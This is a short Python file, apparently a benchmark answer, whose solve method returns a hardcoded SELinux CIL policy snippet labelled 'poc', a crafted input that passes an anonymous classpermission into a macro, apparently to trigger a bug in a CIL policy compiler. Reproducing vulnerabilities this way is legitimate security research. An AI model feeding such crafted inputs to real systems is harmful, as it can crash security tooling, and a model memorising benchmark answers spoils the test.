import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            b"(block m "
            b"(class c (p)) "
            b"(type t) "
            b"(macro m1 ((classpermission cp)) (classpermissionset s (cp))) "
            b"(call m1 ((classpermission (c (p))))) "
            b"(allow t t (c (p)))"
            b")\n"
        )
        return poc